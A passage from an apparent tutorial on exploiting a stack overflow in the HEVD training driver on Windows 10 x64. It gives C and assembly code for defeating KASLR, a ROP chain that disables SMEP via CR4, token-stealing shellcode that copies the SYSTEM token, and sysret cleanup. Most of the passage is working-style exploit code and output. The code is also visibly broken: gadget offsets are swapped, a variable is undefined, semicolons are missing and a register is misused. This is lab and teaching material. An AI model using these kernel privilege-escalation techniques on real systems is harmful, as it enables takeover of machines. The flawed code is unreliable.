href="https://github.com/wetw0rk/Exploit-Development/tree/master/HEVD-Exploits/0x01%20-%20Stack%20Overflow/Windows%2010%20(x64)">here</a> is a poc where he used this technique.</p><h3 id="kaslr"><span class="me-2">KASLR</span><a href="#kaslr" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Kernel Address Space Layout Randomization is a security feature that randomizes the memory layout of the operating system’s kernel and its components each time the system boots.</p><p>so this exploit assumes you are already in the system and have at least a shell into the target machine which makes KASLR useless but for example if you don’t have access to the target machine its not possible to know the base address of the kernel without a memory leak vulnerability and without the kernel base you can’t write your exploit like writing to kernel memory you need to write all your kernel addresses relative to the kernel base but luckily for us this is not a problem we can use windows api to get the kernel base address dynamically or you can even use windbg or a debugger to get it.</p><h2 id="bypassing-kaslr"><span class="me-2">Bypassing KASLR</span><a href="#bypassing-kaslr" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>lets start with KASLR as i said this is very easy and we can write a simple function that gets the kernel base for us so we don’t need to worry about it.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="kt">uint64_t</span> <span class="nf">GetKernelBaseAddress</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">ULONG_PTR</span> <span class="n">pKernelBaseAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">LPVOID</span><span class="o">*</span> <span class="n">lpImageBase</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">dwBytesNeeded</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwBytesNeeded</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to calculate bytes needed for device driver entries"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">lpImageBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span><span class="o">*</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dwBytesNeeded</span><span class="p">)))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to allocate heap for lpImageBase</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lpImageBase</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">HeapFree</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpImageBase</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">,</span> <span class="n">dwBytesNeeded</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwBytesNeeded</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] EnumDeviceDrivers: %d"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lpImageBase</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">HeapFree</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpImageBase</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">pKernelBaseAddress</span> <span class="o">=</span> <span class="p">((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">lpImageBase</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">HeapFree</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpImageBase</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Kernel Base Address: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pKernelBaseAddress</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">pKernelBaseAddress</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>what we are doing here is getting the address of <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code> which is the windows kernel itself, its the first loaded driver therefore <code class="language-plaintext highlighter-rouge">lpImageBase[0]</code> gives us its address</p><p>Well that was easy ! we bypassed KASLR by getting the kernel base address</p><h2 id="bypassing-smep"><span class="me-2">Bypassing SMEP</span><a href="#bypassing-smep" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>now this will be harder since we will need to use rop (return oriented programming) to bypass SMEP.</p><p>we will use the first method so we will need to change the value of cr4 into the same value but we flip the 20th bit, we are left with two choices here</p><p>whether we use a rop chain like this :</p><p>pop REGISTER mov cr4, REGISTER</p><p>in this case we will need to read the value of cr4 using a debugger then flip the bit and put it in our stack</p><p>or the best approach is:</p><p>pop REGISTER1 // 0x100000 xor cr4, REGISTER</p><p>obviously the second one is much better but we don’t really have a choice we have to check if these rop gadgets are available but the good news is since we are in the kernel all drivers are loaded in the same memory so we don’t need to only look for gadgets inside HEVD we can look inside any driver !</p><p>we will try to find gadgets for the first method since i am sure we will find inside <code class="language-plaintext highlighter-rouge">ntoskernl.exe</code></p><p>to do so we can use a bunch of tools like</p><ul><li>ROPgadget<li>Ropper</ul><p>in this guide we will use ropper</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>ropper --file ntoskrnl.exe --console
search %cr4%
&gt; 0x0000000140207c53: mov cr4, rcx; ret;
search pop rcx
&gt; 0x00000001404bc9a7: pop rcx; ret;
</pre></table></code></div></div><p>make sure to get ntoskrnl from the target machine and don’t use the gadgets i got until you are sure they exist in your build</p><p>nice we have what we need we can write an exploit now</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Psapi.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span>
<span class="cp">#define QWORD ULONGLONG
</span><span class="kt">uint64_t</span> <span class="nf">GetKernelBaseAddress</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">ULONG_PTR</span> <span class="n">pKernelBaseAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">LPVOID</span><span class="o">*</span> <span class="n">lpImageBase</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">dwBytesNeeded</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwBytesNeeded</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to calculate bytes needed for device driver entries"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">lpImageBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span><span class="o">*</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dwBytesNeeded</span><span class="p">)))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to allocate heap for lpImageBase</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lpImageBase</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">HeapFree</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpImageBase</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">,</span> <span class="n">dwBytesNeeded</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwBytesNeeded</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] EnumDeviceDrivers: %d"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lpImageBase</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">HeapFree</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpImageBase</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">pKernelBaseAddress</span> <span class="o">=</span> <span class="p">((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">lpImageBase</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">HeapFree</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpImageBase</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Kernel Base Address: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pKernelBaseAddress</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">pKernelBaseAddress</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">hDriver</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="s">L"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HacksysExtremeVulnerableDriver"</span><span class="p">,</span>
        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hDriver</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while creating a handle to the driver: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">ULONG_PTR</span> <span class="n">ntBase</span> <span class="o">=</span> <span class="n">GetKernelBaseAddress</span><span class="p">();</span> <span class="c1">// gets the kernel base address</span>

    <span class="n">QWORD</span> <span class="n">POP_RCX</span> <span class="o">=</span> <span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x207c53</span><span class="p">;</span>      <span class="c1">// change the offset to what you got from ropper</span>
    <span class="n">QWORD</span> <span class="n">MOV_CR4_RCX</span> <span class="o">=</span> <span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x4bc9a7</span><span class="p">;</span>  <span class="c1">// change the offset to what you got from ropper</span>

    <span class="n">LPVOID</span> <span class="n">buf</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">3000</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="n">LPVOID</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">500</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">bufSize</span> <span class="o">=</span> <span class="mi">2072</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="n">bufSize</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mi">500</span><span class="p">)</span>

    <span class="n">QWORD</span><span class="o">*</span> <span class="n">rop</span> <span class="o">=</span> <span class="p">(</span><span class="n">QWORD</span><span class="o">*</span><span class="p">)((</span><span class="n">QWORD</span><span class="p">)</span><span class="n">uBuffer</span> <span class="o">+</span> <span class="mi">2072</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="o">*</span><span class="p">(</span><span class="n">rop</span> <span class="o">+</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">POP_RCX</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">rop</span> <span class="o">+</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// set cr4 to 0 for now </span>
    <span class="o">*</span><span class="p">(</span><span class="n">rop</span> <span class="o">+</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">MOV_CR4_RCX</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">rop</span> <span class="o">+</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">QWORD</span><span class="p">)</span><span class="n">shellcode</span><span class="p">;</span>

    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDriver</span><span class="p">,</span> <span class="mh">0x222003</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">2500</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>what you need to do now is run the exploit you will get a BSOD then in windbg run <code class="language-plaintext highlighter-rouge">r cr4</code> which is the value of cr4 we need to change so we will next update the exploit with the right address for me i got 0x370e78 but it might be different for you here is the updated main</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">hDriver</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="s">L"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HacksysExtremeVulnerableDriver"</span><span class="p">,</span>
        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hDriver</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while creating a handle to the driver: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">ULONG_PTR</span> <span class="n">ntBase</span> <span class="o">=</span> <span class="n">GetKernelBaseAddress</span><span class="p">();</span> <span class="c1">// gets the kernel base address</span>

    <span class="n">QWORD</span> <span class="n">POP_RCX</span> <span class="o">=</span> <span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x207c53</span><span class="p">;</span>      <span class="c1">// change the offset to what you got from ropper</span>
    <span class="n">QWORD</span> <span class="n">MOV_CR4_RCX</span> <span class="o">=</span> <span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x4bc9a7</span><span class="p">;</span>  <span class="c1">// change the offset to what you got from ropper</span>

    <span class="n">LPVOID</span> <span class="n">buf</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">3000</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="n">LPVOID</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">500</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">bufSize</span> <span class="o">=</span> <span class="mi">2072</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="n">bufSize</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mi">500</span><span class="p">)</span>

    <span class="n">QWORD</span><span class="o">*</span> <span class="n">rop</span> <span class="o">=</span> <span class="p">(</span><span class="n">QWORD</span><span class="o">*</span><span class="p">)((</span><span class="n">QWORD</span><span class="p">)</span><span class="n">uBuffer</span> <span class="o">+</span> <span class="mi">2072</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="o">*</span><span class="p">(</span><span class="n">rop</span> <span class="o">+</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">POP_RCX</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">rop</span> <span class="o">+</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x370e78</span> <span class="o">^</span> <span class="mi">1UL</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">;</span> <span class="c1">// flips the 20th bit</span>
    <span class="o">*</span><span class="p">(</span><span class="n">rop</span> <span class="o">+</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">MOV_CR4_RCX</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">rop</span> <span class="o">+</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">QWORD</span><span class="p">)</span><span class="n">shellcode</span><span class="p">;</span>

    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDriver</span><span class="p">,</span> <span class="mh">0x222003</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">2500</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>before we run the exploit we will set a break point inside the vulnerable function so we can see the nops being executed :</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ba e1 HEVD!TriggerBufferOverflowStack
</pre></table></code></div></div><p>nice now run the exploit then keep going step by step until you reach the memmove which is a memcpy you will see something like this</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>1: kd&gt; 
0000026a`93680000 90              nop
</pre></table></code></div></div><p>thats it we mananged to execute shellcode !</p><h2 id="writing-the-shellcode"><span class="me-2">Writing The Shellcode</span><a href="#writing-the-shellcode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>now since our test shellcode worked we can right real shellcode, we are in kernel mode so first idea that comes to mind is token so we will steal a token and give it to our process in order to escalate our privs so lets right our shellcode</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>[BITS 64]
start:
  mov rax, [gs:0x188]       ; KPCRB.CurrentThread (_KTHREAD)
  mov rax, [rax + 0xb8]     ; APCState.Process (current _EPROCESS)
  mov r8, rax               ; Store current _EPROCESS ptr in r8

loop:
  mov r8, [r8 + 0x1d8]      ; ActiveProcessLinks.Flink 
  sub r8, 0x1d8             ; Go back to start of _EPROCESS 
  mov r9, [r8 + 0x1d0]      ; UniqueProcessId (PID) 
  cmp r9, 4                 ; SYSTEM PID == 4? 
  jnz loop                  ; Loop until PID == 4

replace:
  mov r9, [r8 + 0x248]      ; Get SYSTEM token
  and cl, 0xf0              ; Clear low 4 bits of _EX_FAST_REF structure
  mov [rax + 0x248], r9     ; Copy SYSTEM token to current process

</pre></table></code></div></div><p>what this does is first get the current thread in the cpu then inside the APCState there is a field for the current EPROCESS called <code class="language-plaintext highlighter-rouge">APCState.Process</code>, in kernel mode all EPROCESS are linked in a doubly linked circular list inside ActiveProcessLinks we find the address to the next process so we traverse the list and we subtract the offset of the <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code> so we get to the start of the EPROCESS then we look at the <code class="language-plaintext highlighter-rouge">UniqueProcessId</code> to find the process id we are looking for pid number 4 which is the SYSTEM pid once we find it we get its token and copy it into our EPROCESS which gives us the same privs</p><h3 id="generic-cleanup-technique"><span class="me-2">Generic Cleanup Technique</span><a href="#generic-cleanup-technique" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>if you run the exploit with that shellcode you will get a BSOD, why ?</p><p>well because we hijacked the execution flow and altered with the registers so after our shellcodes finishes the system expects the registers to have the values it had before the hijack and thats why we need to preform proper cleanup when we exit our shellcode.</p><p>we can push all registers before we do anything then pop them at the end of the shellcode but i guess you will need more rop chains to backup the registers before the op</p><p>or what we can do is use a structure inside our current thread struct ETHREAD which holds the registers before we entered kernel mode so instead of staying in kernel mode we go back to user mode you can read more about it from <a href="https://kristal-g.github.io/2021/05/08/SYSRET_Shellcode.html">here</a> we basically mimic what the system does when calling <code class="language-plaintext highlighter-rouge">syscall</code> which is how the system tells the kernel to do stuff from usermode</p><p>here is the code</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>cleanup:
  mov rax, [gs:0x188]       ; _KPCR.Prcb.CurrentThread
  mov cx, [rax + 0x1e4]     ; KTHREAD.KernelApcDisable
  inc cx
  mov [rax + 0x1e4], cx
  mov rdx, [rax + 0x90]     ; ETHREAD.TrapFrame
  mov rcx, [rdx + 0x168]    ; ETHREAD.TrapFrame.Rip
  mov r11, [rdx + 0x178]    ; ETHREAD.TrapFrame.EFlags
  mov rsp, [rdx + 0x180]    ; ETHREAD.TrapFrame.Rsp
  mov rbp, [rdx + 0x158]    ; ETHREAD.TrapFrame.Rbp
  xor eax, eax  ;
  swapgs
  o64 sysret  
</pre></table></code></div></div><p>now our shellcode is</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>[BITS 64]
start:
  mov rax, [gs:0x188]       ; KPCRB.CurrentThread (_KTHREAD)
  mov rax, [rax + 0xb8]     ; APCState.Process (current _EPROCESS)
  mov r8, rax               ; Store current _EPROCESS ptr in r8

loop:
  mov r8, [r8 + 0x1d8]      ; ActiveProcessLinks 
  sub r8, 0x1d8            ; Go back to start of _EPROCESS 
  mov r9, [r8 + 0x1d0]      ; UniqueProcessId (PID) 
  cmp r9, 4                 ; SYSTEM PID? 
  jnz loop                  ; Loop until PID == 4

replace:
  mov r9, [r8 + 0x248]      ; Get SYSTEM token
  and cl, 0xf0              ; Clear low 4 bits of _EX_FAST_REF structure
  mov [rax + 0x248], r9     ; Copy SYSTEM token to current process


cleanup:
  mov rax, [gs:0x188]       ; _KPCR.Prcb.CurrentThread
  mov cx, [rax + 0x1e4]     ; KTHREAD.KernelApcDisable
  inc cx
  mov [rax + 0x1e4], cx
  mov rdx, [rax + 0x90]     ; ETHREAD.TrapFrame
  mov rcx, [rdx + 0x168]    ; ETHREAD.TrapFrame.Rip
  mov r11, [rdx + 0x178]    ; ETHREAD.TrapFrame.EFlags
  mov rsp, [rdx + 0x180]    ; ETHREAD.TrapFrame.Rsp
  mov rbp, [rdx + 0x158]    ; ETHREAD.TrapFrame.Rbp
  xor eax, eax  ;
  swapgs
  o64 sysret  
</pre></table></code></div></div><p>convert it into shellcode</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>nasm shellcode.asm -o shellcode.bin -f bin
radare2 -b 32 -c 'pc' ./shellcode.bin 
